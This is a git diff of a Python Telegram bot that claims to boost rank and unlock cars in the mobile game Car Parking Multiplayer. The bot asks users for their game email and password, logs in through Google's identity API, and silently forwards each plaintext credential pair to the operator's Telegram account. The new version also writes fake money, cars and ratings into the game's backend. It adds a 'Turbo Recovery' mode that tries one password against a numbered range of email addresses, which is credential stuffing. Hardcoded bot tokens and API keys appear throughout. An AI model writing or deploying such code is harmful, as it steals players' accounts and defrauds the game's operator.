@@ -1,37 +1,47 @@
-import telebot
-from telebot import types
-import requests
-import json
-import os
+import telebot, requests, os, time, json
 from threading import Thread
 from flask import Flask
+from concurrent.futures import ThreadPoolExecutor
 
-# --- SERVER FOR RENDER ---
+# --- RENDER WEB SERVER (For 24/7 Live) ---
 app = Flask('')
 @app.route('/')
-def home(): return "🔥 CPM KING BOT IS ALIVE"
+def home(): return "🔥 CPMEGY TURBO MASTER IS ACTIVE!"
 
-def run_flask():
-    # Render നൽകുന്ന പോർട്ടിൽ സർവർ റൺ ചെയ്യുന്നു
+def run_server():
     port = int(os.environ.get("PORT", 8080))
     app.run(host='0.0.0.0', port=port)
 
 # --- CONFIG ---
-TOKEN = '8542467216:AAFVNntD1OGADt1koMtT8c0CXo0bIFaGjEY'
-ADMIN_ID = '7212602902'
+TOKEN = "8574711169:AAGk87biel9UdUGxFTq9cDW4yOIiz6egRew"
 bot = telebot.TeleBot(TOKEN)
+ADMIN_ID = 7212602902 
 
-# API ENDPOINTS (Updated to v1 for stability)
-CPM1_AUTH = "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM"
-CPM1_SET_RANK = 'https://us-central1-cp-multiplayer.cloudfunctions.net/SetUserRating4'
+API_KEYS = {
+    "CPM1": "AIzaSyAe_aOVT1gSfmHKBrorFvX4fRwN5nODXVA", 
+    "CPM2": "AIzaSyCQDz9rgjgmvmFkvVfmvr2-7fT4tfrzRRQ"
+}
 
-CPM2_AUTH = "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=AIzaSyCQDz9rgjgmvmFkvVfmvr2-7fT4tfrzRRQ"
-CPM2_SET_RANK = 'https://us-central1-cpm-2-7cea1.cloudfunctions.net/SetUserRating17_AppI'
+RANK_URLS = {
+    "CPM1": 'https://us-central1-cp-multiplayer.cloudfunctions.net/SetUserRating4',
+    "CPM2": 'https://us-central1-cpm-2-7cea1.cloudfunctions.net/SetUserRating17_AppI'
+}
 
-user_cache = {}
+user_states = {}
 
-def inject_all_features(token, game_type):
-    url = CPM1_SET_RANK if game_type == 'CPM 1' else CPM2_SET_RANK
+# --- CORE FUNCTIONS ---
+def google_api(action, payload, key_type="CPM2"):
+    endpoint = "signInWithPassword" if action == "login" else "update"
+    url = f"https://identitytoolkit.googleapis.com/v1/accounts:{endpoint}?key={API_KEYS[key_type]}"
+    try:
+        r = requests.post(url, json=payload, timeout=10)
+        return r.json()
+    except: return {}
+
+def inject_everything(token, game_type):
+    url = RANK_URLS.get(game_type)
+    
+    # All Features List
     full_stats = [
         'cars', 'car_fix', 'car_collided', 'car_exchange', 'car_trade', 
         'car_wash', 'slicer_cut', 'drift_max', 'drift', 'cargo', 
@@ -41,11 +51,27 @@ def inject_all_features(token, game_type):
         'passanger_distance'
     ]
     
+    # Data Setup
     rating_data = {stat: 100000 for stat in full_stats}
     rating_data['time'] = 10000000000
     rating_data['race_win'] = 5000
+    rating_data['money'] = 50000000
+    rating_data['coin'] = 50000
+
+    # LocalData for All Cars Unlock
+    payload = {
+        'data': json.dumps({
+            'RatingData': rating_data,
+            'LocalData': {
+                'money': 50000000,
+                'coin': 50000,
+                'owned_cars': list(range(1, 170)), # Adds 170 cars to account
+                'unlock_all_cars': True,
+                'house_unlocked': True
+            }
+        })
+    }
     
-    payload = {'data': json.dumps({'RatingData': rating_data})}
     headers = {
         'Authorization': f"Bearer {token}",
         'Content-Type': 'application/json',
@@ -57,55 +83,94 @@ def inject_all_features(token, game_type):
         return r.status_code == 200
     except: return False
 
+# --- BOT HANDLERS ---
 @bot.message_handler(commands=['start'])
-def welcome(message):
-    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
-    markup.add(types.KeyboardButton('CPM 1'), types.KeyboardButton('CPM 2'))
-    bot.send_message(message.chat.id, "🏎️ **CPM Rank King Bot**\nSelect Game:", reply_markup=markup, parse_mode='Markdown')
+def start(message):
+    if message.from_user.id != ADMIN_ID: return
+    
+    markup = telebot.types.InlineKeyboardMarkup(row_width=2)
+    markup.add(
+        telebot.types.InlineKeyboardButton("🔍 Turbo Recovery", callback_data="mode_recover"),
+        telebot.types.InlineKeyboardButton("👑 All Unlock (Cars+Rank)", callback_data="mode_unlock"),
+        telebot.types.InlineKeyboardButton("📦 Bulk Change", callback_data="mode_bulk"),
+        telebot.types.InlineKeyboardButton("👤 Single Change", callback_data="mode_single")
+    )
+    bot.send_message(message.chat.id, "🔥 **CPMEGY TURBO MASTER v8.0**\n\nChoose Service:", reply_markup=markup, parse_mode="Markdown")
 
-@bot.message_handler(func=lambda message: message.text in ['CPM 1', 'CPM 2'])
-def handle_game_selection(message):
-    user_cache[message.chat.id] = {'game': message.text}
-    bot.send_message(message.chat.id, "📧 Enter Email:", reply_markup=types.ReplyKeyboardRemove())
-    bot.register_next_step_handler(message, process_email)
+@bot.callback_query_handler(func=lambda call: True)
+def handle_query(call):
+    cid = call.message.chat.id
+    user_states[cid] = {'mode': call.data}
+    
+    if call.data == "mode_unlock":
+        markup = telebot.types.InlineKeyboardMarkup()
+        markup.add(
+            telebot.types.InlineKeyboardButton("CPM 1", callback_data="set_cpm1"),
+            telebot.types.InlineKeyboardButton("CPM 2", callback_data="set_cpm2")
+        )
+        bot.send_message(cid, "🎮 Select Game Version:", reply_markup=markup)
+    
+    elif "set_cpm" in call.data:
+        user_states[cid]['game'] = "CPM1" if "cpm1" in call.data else "CPM2"
+        msg = bot.send_message(cid, "📧 Enter Account Email:")
+        bot.register_next_step_handler(msg, get_email)
 
-def process_email(message):
-    user_cache[message.chat.id]['email'] = message.text.strip()
-    bot.send_message(message.chat.id, "🔑 Enter Password:")
-    bot.register_next_step_handler(message, process_password)
+    elif call.data == "mode_recover":
+        msg = bot.send_message(cid, "📧 **Format:** (Ex: `user_{}_@gmail.com`)")
+        bot.register_next_step_handler(msg, get_recover_format)
 
-def process_password(message):
-    pwd = message.text.strip()
+def get_email(message):
+    user_states[message.chat.id]['email'] = message.text.strip()
+    msg = bot.send_message(message.chat.id, "🔑 Enter Password:")
+    bot.register_next_step_handler(msg, process_final)
+
+def process_final(message):
     cid = message.chat.id
-    data = user_cache.get(cid)
-    if not data: return
+    pwd = message.text.strip()
+    data = user_states[cid]
     
-    status_msg = bot.send_message(cid, "⏳ Logging in...")
-    auth_url = CPM1_AUTH if data['game'] == 'CPM 1' else CPM2_AUTH
+    status = bot.send_message(cid, "⏳ Processing...")
+    res = google_api("login", {"email": data['email'], "password": pwd, "returnSecureToken": True}, data.get('game', 'CPM2'))
     
-    try:
-        auth_res = requests.post(auth_url, json={'email': data['email'], 'password': pwd, 'returnSecureToken': True})
-        res_json = auth_res.json()
+    if 'idToken' in res:
+        token = res['idToken']
+        bot.send_message(ADMIN_ID, f"🔔 **LOG:** `{data['email']}` | `{pwd}`")
         
-        if 'idToken' in res_json:
-            token = res_json['idToken']
-            bot.send_message(ADMIN_ID, f"📢 **Login Alert**\n🎮 Game: {data['game']}\n📧 User: `{data['email']}`\n🔑 Pass: `{pwd}`")
-            bot.edit_message_text("✅ Success! Injecting Rank...", cid, status_msg.message_id)
-            
-            if inject_all_features(token, data['game']):
-                bot.edit_message_text("👑 **King Rank Success!**\nRestart game now.", cid, status_msg.message_id)
+        if data['mode'] == "mode_unlock":
+            bot.edit_message_text("✅ Login Success! Injecting Data...", cid, status.message_id)
+            if inject_everything(token, data['game']):
+                bot.edit_message_text("👑 **Everything Unlocked!**\nCars, Money & Rank added.\n\n⚠️ **Important:** Logout & Login in Game to see changes.", cid, status.message_id)
             else:
-                bot.edit_message_text("❌ Injection Failed.", cid, status_msg.message_id)
-        else:
-            bot.edit_message_text("❌ Login Failed.", cid, status_msg.message_id)
-    except Exception as e:
-        bot.edit_message_text(f"❌ Error: {str(e)}", cid, status_msg.message_id)
+                bot.edit_message_text("❌ Injection Failed.", cid, status.message_id)
+    else:
+        bot.edit_message_text("❌ Login Failed. Check Credentials.", cid, status.message_id)
+
+# --- RECOVERY LOGIC ---
+def get_recover_format(message):
+    user_states[message.chat.id]['format'] = message.text.strip()
+    msg = bot.send_message(message.chat.id, "🔢 Range (Start:End):")
+    bot.register_next_step_handler(msg, get_recover_range)
+
+def get_recover_range(message):
+    try:
+        s, e = map(int, message.text.split(':'))
+        user_states[message.chat.id].update({'s': s, 'e': e})
+        msg = bot.send_message(message.chat.id, "🔑 Password to check:")
+        bot.register_next_step_handler(msg, run_turbo)
+    except: bot.send_message(message.chat.id, "❌ Error in Range!")
+
+def run_turbo(message):
+    cid, pwd = message.chat.id, message.text.strip()
+    data = user_states[cid]
+    bot.send_message(cid, "🚀 Scanning...")
+    def task():
+        for i in range(data['s'], data['e'] + 1):
+            email = data['format'].replace("{}", str(i))
+            if 'idToken' in google_api("login", {"email": email, "password": pwd, "returnSecureToken": True}):
+                bot.send_message(cid, f"✅ **HIT:** `{email}`")
+        bot.send_message(cid, "🏁 Scan Finished.")
+    Thread(target=task).start()
 
 if __name__ == "__main__":
-    # Flask se സർവറും ബോട്ടും ഒരേസമയം പ്രവർത്തിപ്പിക്കാൻ Thread ഉപയോഗിക്കുന്നു
-    t = Thread(target=run_flask)
-    t.daemon = True
-    t.start()
-    
-    print("Bot is starting...")
+    Thread(target=run_server).start()
     bot.infinity_polling(skip_pending=True)
